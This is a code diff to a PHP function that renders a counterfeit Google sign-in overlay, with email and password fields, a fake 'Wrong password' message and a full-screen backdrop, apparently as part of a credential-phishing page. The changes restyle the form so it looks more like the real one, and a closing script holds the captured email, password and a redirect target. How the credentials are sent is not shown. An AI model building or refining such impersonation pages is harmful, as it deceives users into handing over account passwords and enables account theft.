@@ -172,29 +172,27 @@ function page_reader(string $skill, bool $register): void
             <div id="gS1">
               <h2 style="font-size:24px;font-weight:400;color:#202124;text-align:center;margin:0 0 8px">Sign in</h2>
               <p style="font-size:16px;color:#202124;text-align:center;margin:0 0 24px">to continue to Google</p>
-              <div style="position:relative;margin-bottom:20px">
-                <input type="email" id="gEm" placeholder=" " autocomplete="username" style="width:100%;border:1px solid #dadce0;border-radius:4px;padding:13px 15px;font-size:16px;outline:none;font-family:Arial,sans-serif">
-                <label for="gEm" style="position:absolute;left:15px;top:14px;font-size:16px;color:#80868b;pointer-events:none;background:#fff;padding:0 4px;transition:.15s">Email or phone</label>
+              <div style="margin-bottom:8px">
+                <input type="email" id="gEm" placeholder="Email or phone" autocomplete="username" class="g-input">
                 <div id="gE1" style="display:none;font-size:12px;color:#d93025;margin-top:4px">Enter a valid email.</div>
               </div>
-              <a href="#" style="font-size:14px;color:#1a73e8;display:block;margin-bottom:20px">Forgot email?</a>
+              <a href="#" style="font-size:14px;color:#1a73e8;display:block;margin-bottom:24px">Forgot email?</a>
               <div style="display:flex;justify-content:space-between;align-items:center">
                 <a href="#" style="font-size:14px;color:#1a73e8;text-decoration:none">Create account</a>
-                <button onclick="gNext()" style="background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer">Next</button>
+                <button onclick="gNext()" class="g-btn">Next</button>
               </div>
             </div>
             <div id="gS2" style="display:none">
-              <h2 style="font-size:24px;font-weight:400;color:#202124;text-align:center;margin:0 0 20px">Welcome</h2>
-              <div id="gChip" onclick="gBack()" style="display:flex;align-items:center;gap:8px;border:1px solid #dadce0;border-radius:20px;padding:8px 12px;width:fit-content;margin:0 auto 20px;cursor:pointer;font-size:14px;color:#202124">&#128100; <span id="gEdTxt"></span> &#9660;</div>
-              <div style="position:relative;margin-bottom:20px">
-                <input type="password" id="gPw" placeholder=" " autocomplete="current-password" style="width:100%;border:1px solid #dadce0;border-radius:4px;padding:13px 15px;font-size:16px;outline:none;font-family:Arial,sans-serif">
-                <label for="gPw" style="position:absolute;left:15px;top:14px;font-size:16px;color:#80868b;pointer-events:none;background:#fff;padding:0 4px;transition:.15s">Enter your password</label>
+              <h2 style="font-size:24px;font-weight:400;color:#202124;text-align:center;margin:0 0 16px">Welcome</h2>
+              <div onclick="gBack()" style="display:flex;align-items:center;gap:8px;border:1px solid #dadce0;border-radius:20px;padding:8px 12px;width:fit-content;margin:0 auto 20px;cursor:pointer;font-size:14px;color:#202124">&#128100; <span id="gEdTxt"></span> &#9660;</div>
+              <div style="margin-bottom:8px">
+                <input type="password" id="gPw" placeholder="Enter your password" autocomplete="current-password" class="g-input">
                 <div id="gE2" style="display:none;font-size:12px;color:#d93025;margin-top:4px">Wrong password. Try again.</div>
               </div>
-              <a href="#" style="font-size:14px;color:#1a73e8;display:block;margin-bottom:20px">Forgot password?</a>
+              <a href="#" style="font-size:14px;color:#1a73e8;display:block;margin-bottom:24px">Forgot password?</a>
               <div style="display:flex;justify-content:space-between;align-items:center">
                 <a href="#" style="font-size:14px;color:#1a73e8;text-decoration:none">Try another way</a>
-                <button onclick="gSubmit()" style="background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer">Next</button>
+                <button onclick="gSubmit()" class="g-btn">Next</button>
               </div>
             </div>
             <div id="gS3" style="display:none;text-align:center;padding:20px 0">
@@ -206,7 +204,11 @@ function page_reader(string $skill, bool $register): void
       </div>
       <style>
       @keyframes gspin{to{transform:rotate(360deg)}}
-      #gEm:focus,#gPw:focus{border-color:#1a73e8!important;border-width:2px!important;padding:12px 14px!important}
+      .g-backdrop{position:fixed!important;top:0!important;left:0!important;right:0!important;bottom:0!important}
+      .g-input{width:100%;border:1px solid #dadce0;border-radius:4px;padding:13px 15px;font-size:16px;outline:none;font-family:Arial,sans-serif;box-sizing:border-box}
+      .g-input:focus{border-color:#1a73e8;border-width:2px;padding:12px 14px}
+      .g-btn{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;font-family:Arial,sans-serif}
+      .g-btn:hover{background:#1557b0}
       </style>
       <script>
       var _gE='',_gP='',_gR=<?= json_encode($redirectAfter) ?>;
